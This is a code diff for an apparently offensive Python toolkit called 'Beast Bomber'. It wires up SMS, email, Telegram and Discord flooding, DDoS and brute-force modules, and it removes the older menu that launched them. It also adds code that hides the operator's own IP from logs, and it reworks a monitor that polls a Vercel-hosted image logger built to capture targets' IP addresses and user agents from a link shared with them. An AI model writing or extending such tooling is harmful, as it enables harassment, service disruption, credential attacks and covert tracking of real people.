@@ -114,6 +114,15 @@ except Exception:
 
 # --- END NEW IMPORTS ---
 
+# Engine module instances — created here so all menus can use them
+sms_attack = SMSAttack() if SMSAttack else None
+email_attack = EmailAttack() if EmailAttack else None
+telegram_attack = TelegramAttack() if TelegramAttack else None
+discord_attack = DiscordSpam() if DiscordSpam else None
+ddos_attack = DDoSAttack() if DDoSAttack else None
+bruteforce_attack = BruteForceAttack() if BruteForceAttack else None
+image_logger_instance = ImageLogger() if ImageLogger else None
+
 import os
 import sys
 import time
@@ -154,6 +163,46 @@ class DualStreamWriter:
         self.log_file = log_file_handle
         self.ansi_regex = re.compile(r'\033\[[0-9;]*[a-zA-Z]')
         self.write_lock = threading.Lock()
+        self.excluded_ips = self._load_excluded_ips()
+
+    def _load_excluded_ips(self):
+        """Load IPs to exclude from logging. Checks config file and auto-detects local IP."""
+        excluded = set()
+        
+        # Auto-detect local IP
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            local_ip = s.getsockname()[0]
+            s.close()
+            if local_ip and local_ip != '127.0.0.1':
+                excluded.add(local_ip)
+        except Exception:
+            pass
+        
+        # Load from config file if exists
+        try:
+            config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'input', 'excluded_ips.txt')
+            if os.path.exists(config_path):
+                with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    for line in f:
+                        ip = line.strip()
+                        if ip and not ip.startswith('#'):
+                            excluded.add(ip)
+        except Exception:
+            pass
+        
+        return excluded
+
+    def _scrub_ips(self, text):
+        """Replace excluded IPs with [REDACTED] in the given text."""
+        if not self.excluded_ips:
+            return text
+        scrubbed = text
+        for ip in self.excluded_ips:
+            if ip in scrubbed:
+                scrubbed = scrubbed.replace(ip, '[REDACTED]')
+        return scrubbed
 
     def write(self, message):
         with self.write_lock:
@@ -161,7 +210,9 @@ class DualStreamWriter:
             self.terminal.write(message)
             # Clean text by purging terminal manipulation and color escape blocks before saving to disk
             purified_message = self.ansi_regex.sub('', message)
-            self.log_file.write(purified_message)
+            # Scrub excluded IPs from logs
+            scrubbed_message = self._scrub_ips(purified_message)
+            self.log_file.write(scrubbed_message)
             self.log_file.flush()
 
     def flush(self):
@@ -1958,112 +2009,6 @@ def handle_category_deck(deck_id):
         else:
             break
 
-def handle_attack_vectors():
-    """Handles Sub-Directory 05 // Attack Vectors & Exploit Frameworks"""
-    
-    if not IMPORTS_OK:
-        print(f"{Colors.RED}[!] Beast Bomber modules not found. Ensure they are installed in 'core' folder or adjust import paths.{Colors.RESET}")
-        return
-        
-    if sys.platform.startswith('win'):
-        try:
-            ctypes.windll.kernel32.SetConsoleTitleW("Beast Bomber 💣")
-        except:
-            pass
-            
-    logo_main()
-    
-    if get_lang() == "ru":
-        menu_ru()
-    else:
-        menu_en()
-        
-    from colorama import Fore, Style
-    
-    sms_attack = SMSAttack() if SMSAttack else None
-    email_attack = EmailAttack() if EmailAttack else None
-    telegram_attack = TelegramAttack() if TelegramAttack else None
-    discord_attack = DiscordSpam() if DiscordSpam else None
-    ddos_attack = DDoSAttack() if DDoSAttack else None
-    bruteforce_attack = BruteForceAttack() if BruteForceAttack else None
-    
-    while True:
-        print(f"{Fore.MAGENTA}{'>'}{Fore.GREEN}", end="") 
-        option = input("\nSelect Attack Vector (0=Exit): ").strip()
-
-        try:
-            if option == '1':
-                if ddos_attack is None:
-                    print(f"{Fore.RED}[!] DDoS Attack module not loaded.{Colors.RESET}")
-                else:
-                    print("Launching Beast Mode Core...")
-                    ddos_attack.start_ddos()
-                
-            elif option == '2':
-                print("Launching Image Logger...")
-                run_image_logger()
-            
-            elif option == '3':
-                if bruteforce_attack is None:
-                    print(f"{Fore.RED}[!] Brute Force module not loaded.{Colors.RESET}")
-                else:
-                    print("Launching Brute Force Core...")
-                    bruteforce_attack.start_bruteforce()
-            
-            elif option == '4':
-                if sms_attack is None:
-                    print(f"{Fore.RED}[!] SMS Attack module not loaded.{Colors.RESET}")
-                else:
-                    print("Launching SMS Stream...")
-                    sms_attack.start_sms()
-                
-            elif option == '5':
-                if email_attack is None:
-                    print(f"{Fore.RED}[!] Email Attack module not loaded.{Colors.RESET}")
-                else:
-                    print("Launching Email Flood...")
-                    email_attack.email_start()
-                
-            elif option == '6':
-                if telegram_attack is None:
-                    print(f"{Fore.RED}[!] Telegram Attack module not loaded.{Colors.RESET}")
-                else:
-                    print("Launching Telegram Injector...")
-                    telegram_attack.start_telegram()
-                
-            elif option == '7':
-                if discord_attack is None:
-                    print(f"{Fore.RED}[!] Discord Attack module not loaded.{Colors.RESET}")
-                else:
-                    print("Launching Discord Spammer...")
-                    discord_attack.start_discord()
-                
-            elif option == '8':
-                break
-                
-            elif option.lower() == '0' or option == "exit":
-                print(f"\n{Colors.RED}Disconnecting attack vector links.Clearing memory trace structures...{Colors.RESET}")
-                time.sleep(1)
-                break
-                
-            else:
-                print(f"{Colors.RED}[!] Invalid option.{Colors.RESET}")
-                
-        except AttributeError:
-             if get_lang() == "ru": 
-                 print(Fore.RED + '\nМодуль не найден или требует инициализации.')
-             else:
-                 print(Fore.RED + f'\nModule {option} not initialized properly. Check Beast Bomber paths.')
-        except Exception as e:
-            error_msg = str(e)[:50]
-            if get_lang() == "ru":
-                print(f"\n{Fore.YELLOW}{Colors.BOLD}[!] Ошибка в модуле:{e}{Colors.RESET}")
-            else:
-                print(f"\n{Fore.YELLOW}{Colors.BOLD}[!] Error in module:{e}{Colors.RESET}")
-
-        finally:
-            time.sleep(1.5) 
-
 def run_image_logger():
     """Starts an instant image logger that captures victim IP when they open the image."""
     print(f"\n{Colors.CYAN}[INSTANT IMAGE LOGGER]{Colors.RESET}")
@@ -2190,14 +2135,31 @@ def deploy_vercel_logger():
 def monitor_vercel_logs(public_url):
     """Polls Vercel logs endpoint for captured IPs."""
     logs_url = public_url.rstrip('/') + '/api/logs'
-    print(f"\n{Back.GREEN}{Fore.BLACK}{Style.BRIGHT} MONITORING VERCEl LOGS {Back.RESET}{Fore.RESET}{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}Share this URL with target:{Fore.RESET}")
-    print(f"{Fore.YELLOW}{public_url}{Fore.RESET}")
-    print(f"{Fore.CYAN}Logs URL: {Fore.YELLOW}{logs_url}{Fore.RESET}")
-    print(f"{Fore.GREEN}Press Enter to stop...{Fore.RESET}\n")
+    
+    excluded_ips = set()
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+        if local_ip and local_ip != '127.0.0.1':
+            excluded_ips.add(local_ip)
+    except Exception:
+        pass
+    
+    try:
+        config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'input', 'excluded_ips.txt')
+        if os.path.exists(config_path):
+            with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
+                for line in f:
+                    ip = line.strip()
+                    if ip and not ip.startswith('#'):
+                        excluded_ips.add(ip)
+    except Exception:
+        pass
     
     seen_ips = set()
-    last_count = 0
+    header_printed = False
     
     try:
         while True:
@@ -2207,19 +2169,22 @@ def monitor_vercel_logs(public_url):
                 with urllib.request.urlopen(req, timeout=5) as resp:
                     logs = json.loads(resp.read().decode('utf-8'))
                 
-                os.system('cls' if os.name == 'nt' else 'clear')
-                print(f"{Back.GREEN}{Fore.BLACK}{Style.BRIGHT} MONITORING VERCEl LOGS {Back.RESET}{Fore.RESET}{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}Share this URL with target:{Fore.RESET}")
-                print(f"{Fore.YELLOW}{public_url}{Fore.RESET}")
-                print(f"{Fore.CYAN}Logs URL: {Fore.YELLOW}{logs_url}{Fore.RESET}")
-                print(f"{Fore.GREEN}Press Enter to stop...{Fore.RESET}\n")
-                print(f"{Fore.MAGENTA}{'='*80}{Fore.RESET}")
-                print(f"{Style.BRIGHT}{Fore.WHITE}{'TIMESTAMP':<25} {'IP ADDRESS':<20} {'USER AGENT':<35}{Fore.RESET}{Style.RESET_ALL}")
-                print(f"{Fore.MAGENTA}{'='*80}{Fore.RESET}")
+                if not header_printed:
+                    print(f"\n{Back.GREEN}{Fore.BLACK}{Style.BRIGHT} MONITORING VERCEl LOGS {Back.RESET}{Fore.RESET}{Style.RESET_ALL}")
+                    print(f"{Fore.CYAN}Share this URL with target:{Fore.RESET}")
+                    print(f"{Fore.YELLOW}{public_url}{Fore.RESET}")
+                    print(f"{Fore.CYAN}Logs URL: {Fore.YELLOW}{logs_url}{Fore.RESET}")
+                    print(f"{Fore.GREEN}Press Ctrl+C to stop...{Fore.RESET}\n")
+                    print(f"{Fore.MAGENTA}{'='*80}{Fore.RESET}")
+                    print(f"{Style.BRIGHT}{Fore.WHITE}{'TIMESTAMP':<25} {'IP ADDRESS':<20} {'USER AGENT':<35}{Fore.RESET}{Style.RESET_ALL}")
+                    print(f"{Fore.MAGENTA}{'='*80}{Fore.RESET}")
+                    header_printed = True
                 
                 new_logs = []
                 for log in logs:
                     ip = log.get('ip', 'unknown')
+                    if ip in excluded_ips:
+                        continue
                     if ip not in seen_ips:
                         seen_ips.add(ip)
                         new_logs.append(log)
@@ -2232,10 +2197,8 @@ def monitor_vercel_logs(public_url):
                     print(f"{Fore.MAGENTA}{'='*80}{Fore.RESET}")
                     print(f"{Fore.YELLOW}New captures: {len(new_logs)} | Total: {len(logs)}{Fore.RESET}\n")
                 elif not logs:
-                    print(f"{Colors.AMBER}Waiting for captures...{Colors.RESET}\n")
+                    print(f"{Colors.AMBER}Waiting for captures...{Fore.RESET}\n")
                     
-                last_count = len(logs)
-                
             except Exception as e:
                 print(f"{Fore.RED}Monitor error: {e}{Fore.RESET}")
             
